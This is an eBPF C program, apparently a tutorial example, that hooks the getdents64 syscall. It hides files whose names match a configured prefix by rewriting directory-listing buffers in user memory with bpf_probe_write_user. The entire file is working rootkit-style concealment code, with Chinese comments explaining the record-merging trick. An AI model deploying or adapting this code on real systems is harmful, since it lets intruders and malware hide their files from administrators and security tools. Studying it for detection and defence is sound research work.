// SPDX-License-Identifier: (LGPL-2.1 OR BSD-2-Clause)
/* 24-hide: hide files from directory listings by rewriting getdents64 output.
 *
 * On sys_enter_getdents64, save the dirent buffer pointer keyed by pid.  On
 * sys_exit_getdents64, walk the returned buffer.  For entries whose name
 * matches the target prefix, remove them from the listing.
 *
 * 隐藏策略（两种情况）：
 * 1. 非首条目匹配：把前一个条目的 d_reclen 加上当前条目的 d_reclen，
 *    使消费方（ls 等）跳过被隐藏的条目。
 * 2. 首条目匹配：把下一个条目的数据复制到当前位置，并将 d_reclen
 *    设为两个条目之和，然后跳过下一个条目。
 *
 * linux_dirent64 结构：
 *   u64 d_ino;          // 偏移 0:  inode 号
 *   s64 d_off;          // 偏移 8:  到下一个条目的偏移
 *   u16 d_reclen;       // 偏移 16: 本条目总长度
 *   u8  d_type;         // 偏移 18: 文件类型
 *   char d_name[];      // 偏移 19: 文件名（柔性数组）
 */
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "Dual BSD/GPL";

#define MAX_DIRENT_COUNT 256
#define D_RECLEN_OFFSET  16
#define D_NAME_OFFSET    19
#define COPY_BUF_SIZE    128

const volatile int target_strlen = 0;
const char target_name[16] = {};

struct {
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 1024);
	__type(key, u32);
	__type(value, void*);
} dirent_map SEC(".maps");

SEC("tp/syscalls/sys_enter_getdents64")
int handle_enter(struct trace_event_raw_sys_enter *ctx)
{
	u32 pid = bpf_get_current_pid_tgid() >> 32;
	void *dirent = (void *)ctx->args[1];
	bpf_map_update_elem(&dirent_map, &pid, &dirent, BPF_ANY);
	return 0;
}

SEC("tp/syscalls/sys_exit_getdents64")
int handle_exit(struct trace_event_raw_sys_exit *ctx)
{
	u32 pid = bpf_get_current_pid_tgid() >> 32;
	void **direntp, *dirent;
	int ret = (int)ctx->ret;
	char name[16], tmp[16];
	long pos = 0;
	__u16 prev_reclen_off = 0;
	bool has_prev = false;
	int i;

	if (ret <= 0)
		goto out;
	direntp = bpf_map_lookup_elem(&dirent_map, &pid);
	if (!direntp)
		return 0;
	dirent = *direntp;

	if (target_strlen <= 0 || target_strlen > 16)
		goto out;
	bpf_probe_read_kernel(tmp, target_strlen, target_name);

#pragma unroll
	for (i = 0; i < MAX_DIRENT_COUNT; i++) {
		__u16 d_reclen;

		if (pos >= ret)
			break;

		if (bpf_probe_read_user(&d_reclen, sizeof(d_reclen),
					(void *)(dirent + pos + D_RECLEN_OFFSET)))
			break;
		if (d_reclen == 0 || pos + d_reclen > ret)
			break;

		bpf_probe_read_user_str(name, sizeof(name),
					(void *)(dirent + pos + D_NAME_OFFSET));

		bool match = true;
		for (int j = 0; j < 16; j++) {
			if (j >= target_strlen)
				break;
			if (name[j] != tmp[j]) { match = false; break; }
		}

		if (match) {
			if (has_prev) {
				/* 非首条目：合并到前一个条目 */
				__u16 prev_reclen, new_reclen;
				if (bpf_probe_read_user(&prev_reclen, sizeof(prev_reclen),
							(void *)(dirent + prev_reclen_off)))
					goto next;
				new_reclen = prev_reclen + d_reclen;
				bpf_probe_write_user(
					(void *)(dirent + prev_reclen_off),
					&new_reclen, sizeof(new_reclen));
			} else {
				/* 首条目：把下一个条目复制到当前位置 */
				long next_pos = pos + d_reclen;
				__u16 next_reclen;

				if (next_pos >= ret)
					goto next;

				if (bpf_probe_read_user(&next_reclen, sizeof(next_reclen),
							(void *)(dirent + next_pos + D_RECLEN_OFFSET)))
					goto next;
				if (next_reclen == 0 || next_pos + next_reclen > ret)
					goto next;

				/* 复制下一个条目数据到当前位置 */
				__u8 copy_buf[COPY_BUF_SIZE];
				__u16 copy_len = next_reclen;
				if (copy_len > COPY_BUF_SIZE)
					copy_len = COPY_BUF_SIZE;

				if (bpf_probe_read_user(copy_buf, copy_len,
							(void *)(dirent + next_pos)))
					goto next;

				bpf_probe_write_user(
					(void *)(dirent + pos),
					copy_buf, copy_len);

				/* 合并 d_reclen */
				__u16 merged_reclen = d_reclen + next_reclen;
				bpf_probe_write_user(
					(void *)(dirent + pos + D_RECLEN_OFFSET),
					&merged_reclen, sizeof(merged_reclen));

				pos += d_reclen + next_reclen;
				prev_reclen_off = pos + D_RECLEN_OFFSET;
				has_prev = true;
				continue;
			}
		} else {
			prev_reclen_off = pos + D_RECLEN_OFFSET;
			has_prev = true;
		}

next:
		pos += d_reclen;
	}

out:
	bpf_map_delete_elem(&dirent_map, &pid);
	return 0;
}
